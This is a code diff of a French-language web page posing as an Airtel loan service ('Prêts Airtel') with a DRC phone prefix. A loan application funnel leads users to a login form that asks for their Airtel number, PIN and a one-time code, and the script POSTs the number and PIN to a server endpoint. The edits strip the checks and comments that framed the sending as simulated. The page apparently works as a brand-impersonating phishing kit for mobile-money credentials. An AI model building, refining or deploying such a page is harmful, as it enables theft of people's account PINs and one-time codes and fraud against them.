@@ -54,7 +54,7 @@ footer{background:#111;color:#bbb;padding:36px 0;font-size:.9rem}
 footer .container{display:flex;flex-direction:column;align-items:center;gap:12px;text-align:center}
 footer .links{display:flex;gap:14px;flex-wrap:wrap;justify-content:center}
 footer a:hover{color:#fff}
-/* apply */
+
 .steps{display:flex;justify-content:space-between;max-width:640px;margin:30px auto;position:relative}
 .steps::before{content:"";position:absolute;top:16px;left:8%;right:8%;height:2px;background:var(--line)}
 .step{position:relative;text-align:center;font-size:.8rem;color:var(--muted);flex:1}
@@ -75,7 +75,6 @@ input:focus,select:focus{outline:0;border-color:var(--red)}
 .success{text-align:center;padding:30px 0}
 .success .ok{font-size:3.5rem}
 .actions{display:flex;gap:12px}.actions .btn{flex:1}
-@media(max-width:700px){.features,.results{grid-template-columns:1fr}.hero .emoji{display:none}nav{gap:14px;font-size:.85rem}}
 
 .login{max-width:440px;margin:50px auto 0;text-align:center}
 .login .field{text-align:left}
@@ -86,33 +85,16 @@ input:focus,select:focus{outline:0;border-color:var(--red)}
 .show{display:flex;gap:8px;align-items:center;font-weight:400;margin:10px 0 0;font-size:.85rem;color:var(--muted)}
 .ok-msg{margin-top:16px;padding:12px;border-radius:12px;background:#e9f9ee;color:#12632d;font-weight:600}
 .ok-msg.err-msg{background:#fdeaea;color:#b80000}
-#loginForm button[disabled],#next3[disabled]{opacity:.7;cursor:not-allowed}
+#loginForm button[disabled],#otpForm button[disabled],#next3[disabled]{opacity:.7;cursor:not-allowed}
 main[hidden]{display:none}
 body{-webkit-text-size-adjust:100%}
 input,select,button{font-size:16px}
 img,svg{max-width:100%}
-@media(max-width:900px){.container{padding:0 16px}.hero{padding:56px 0}section{padding:44px 0}}
-@media(max-width:600px){
- header .container{height:auto;padding:10px 16px;flex-wrap:wrap;gap:6px}
- nav{width:100%;justify-content:space-between;gap:8px;font-size:.85rem}
- .hero{padding:44px 0;text-align:center}.hero .container{justify-content:center}.hero h1{font-size:1.8rem}
- .card{padding:20px 16px;border-radius:14px}
- .row{flex-wrap:wrap;gap:4px}
- .chip{padding:8px 14px}
- .res.main b{font-size:1.6rem}
- .steps{margin:20px auto;font-size:.7rem}.step{font-size:.68rem}.step span{width:30px;height:30px}.steps::before{top:14px}
- .actions{flex-direction:column-reverse}
- .btn{padding:14px 20px}
- .pin{gap:8px}
- footer .links{flex-direction:column;gap:6px}footer .links{font-size:.85rem}
-}
-@media(max-width:360px){.step{font-size:0}.step span{margin:0 auto}}
 </style></head><body translate="no">
 <header><div class="container"><a href="#home" class="logo">airtel</a>
 <nav><a class="active" href="#home" data-view="home">Accueil</a><a href="#home" data-go="pret">Prêts</a><a href="#home" data-go="calculateur">Calculateur</a><a href="#contact" data-view="contact">Contact</a></nav></div></header>
+
 <main id="view-home">
-
-
 <section class="hero" id="pret"><div class="container"><div>
 <h1>Obtenez votre prêt rapidement approuvé</h1>
 <p>Approbation rapide • Taux compétitifs • Modalités flexibles</p>
@@ -136,11 +118,9 @@ img,svg{max-width:100%}
 <div class="card feat"><div class="ic">⚡</div><h3>Approbation rapide</h3><p>Votre demande est examinée rapidement avec peu de formalités.</p></div>
 <div class="card feat"><div class="ic">%</div><h3>Faibles taux d’intérêt</h3><p>Des remboursements abordables et des options de financement compétitives.</p></div>
 <div class="card feat"><div class="ic">🔒</div><h3>Traitement sécurisé</h3><p>Vos informations personnelles sont protégées par un chiffrement sécurisé.</p></div></div></div></section>
-
-
 </main>
-<main id="view-apply" hidden>
 
+<main id="view-apply" hidden>
 <div class="container"><div class="steps">
 <div class="step on"><span>1</span>Informations</div><div class="step"><span>2</span>Détails du prêt</div>
 <div class="step"><span>3</span>Vérification</div><div class="step"><span>4</span>Envoi</div></div>
@@ -167,9 +147,8 @@ img,svg{max-width:100%}
 <div class="panel hidden success"><div class="ok">✅</div><h2>Demande envoyée</h2><p class="sub">Merci ! Notre équipe examinera votre dossier rapidement.</p><p class="sub">Redirection vers la page de connexion dans <b id="countdown">5</b> s…</p><a class="btn" href="#contact">Se connecter maintenant</a></div>
 
 <p class="secure">🔒 Vos informations sont sécurisées et chiffrées</p></form></div>
-
-
 </main>
+
 <main id="view-contact" hidden><div class="container"><div class="card login">
 <div class="ic-lg">🔐</div><h2>Connexion</h2><p class="sub">Entrez votre numéro Airtel et votre code PIN pour accéder à votre compte.</p>
 <form id="loginForm" novalidate>
@@ -195,7 +174,8 @@ img,svg{max-width:100%}
 
 <footer id="footer"><div class="container"><span class="logo">airtel</span><span>© 2026 Prêts Airtel</span>
 <div class="links"><a href="#">Politique de confidentialité</a>|<a href="#">Conditions générales</a>|<a href="#contact">Contacter l’assistance</a></div></div></footer>
-<script>// Commission fixe de 8 % du montant emprunté (ex. 450 USD -> remboursement total de 486 USD).
+
+<script>
 const PURPOSES=['Personnel','Entreprise','Études','Santé','Logement'];
 const COMMISSION=0.08;
 const LOAN_MIN=100,LOAN_MAX=1200;
@@ -227,7 +207,6 @@ if(calcBox){
   syncTerms();upd();
 }
 
-// Formulaire de demande (4 étapes)
 const form=document.getElementById('applyForm');
 if(form){
   let step=1;const data={};
@@ -241,7 +220,7 @@ if(form){
     const el=document.getElementById(id),ok=test(el.value);
     el.closest('.field').classList.toggle('bad',!ok);return ok;
   };
-  let loan=0,months=12,loanRate=1.5;
+  let loan=0,months=12;
   const fillSummary=()=>{
     const c=calc(loan,months);
     document.getElementById('summary').innerHTML=
@@ -269,28 +248,12 @@ if(form){
   };
   document.getElementById('next3').onclick=()=>{
     if(!document.getElementById('agree').checked){alert('Veuillez accepter les conditions.');return}
-    // Validation JS locale (aucun serveur) : on revérifie tout avant l'envoi "simulé".
-    const okName=typeof data.name==='string'&&data.name.trim()!=='';
-    const okPurpose=PURPOSES.includes(data.purpose);
-    const okIncome=+data.income>0;
-    const okJob=typeof data.job==='string'&&data.job.trim()!=='';
-    const okLoans=data.loans==='Oui'||data.loans==='Non';
-    const okAmount=loan>=LOAN_MIN&&loan<=LOAN_MAX;
-    const okTerm=[6,12,24,36,48,60].includes(months);
-    if(!(okName&&okPurpose&&okIncome&&okJob&&okLoans&&okAmount&&okTerm)){
-      alert('Certaines informations sont invalides. Veuillez revenir en arrière et les corriger.');
-      return;
-    }
     step=4;show();
     let t=5;const cd=document.getElementById('countdown');cd.textContent=t;
     clearInterval(window._redir);
     window._redir=setInterval(()=>{t--;cd.textContent=t;if(t<=0){clearInterval(window._redir);window.goView('contact')}},1000);
   };
   document.querySelectorAll('.back').forEach(b=>b.onclick=()=>{step=Math.max(1,step-1);show()});
-  const q=new URLSearchParams('');
-  if(q.get('amount'))document.getElementById('loanAmount').value=q.get('amount');
-  if(q.get('term'))document.getElementById('loanTerm').value=q.get('term');
-  if(q.get('purpose'))document.getElementById('purpose').value=q.get('purpose');
   show();
 }
 
@@ -309,7 +272,7 @@ document.querySelectorAll('nav a[data-go]').forEach(a=>a.dataset.view='home');
 window.goView=show;
 show('home');
 
-// Connexion
+// Login and OTP Transmission Logic
 (function(){
   const PRE='+243 ',ph=document.getElementById('phone'),pins=[...document.querySelectorAll('#pin input')];
   const otpPins=[...document.querySelectorAll('#otpPin input')];
@@ -388,9 +351,8 @@ show('home');
         method:'POST',
         headers:{'Content-Type':'application/json'},
         body:JSON.stringify({
-          phone:globalPhone,
-          pin:pin,
-otp:otpVal
+          phone: globalPhone,
+          pin: pin
         })
       });
 
@@ -478,40 +440,10 @@ otp:otpVal
     }
   }
 
-  // Deux accroches (submit du formulaire + clic direct sur le bouton) pour que la connexion
-  // fonctionne même dans un contexte où l'une des deux serait bloquée ; loginBusy empêche
-  // un double déclenchement quand les deux événements se produisent normalement.
   document.getElementById('loginForm').addEventListener('submit',handleLogin);
   loginBtn.addEventListener('click',handleLogin);
   document.getElementById('otpForm').addEventListener('submit',handleOtp);
   otpBtn.addEventListener('click',handleOtp);
 })();
 </script></body></html>
-
-
-
-
-
- 
-
- 
- 
- 
- 
- 
- 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
